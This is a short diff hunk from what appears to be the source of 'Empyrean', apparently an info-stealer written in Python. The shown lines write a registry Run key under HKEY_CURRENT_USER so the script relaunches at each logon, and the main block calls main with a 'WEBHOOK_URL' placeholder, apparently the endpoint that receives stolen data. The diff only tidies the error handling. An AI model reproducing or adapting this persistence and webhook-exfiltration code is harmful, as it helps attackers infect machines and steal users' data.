@@ -628,8 +628,8 @@ class startup():
         subprocess.call(["reg", "add", "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "Empyrean", "/t", "REG_SZ", "/d", self.Empyrean_dir + "\\" + os.path.basename(__file__)], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
 if __name__ == "__main__":
-    # try: 
-        main("WEBHOOK_URL")    
+    main("WEBHOOK_URL")    
+    
     # except Exception as e:
     #     print(e)
     #     try: cleanup()
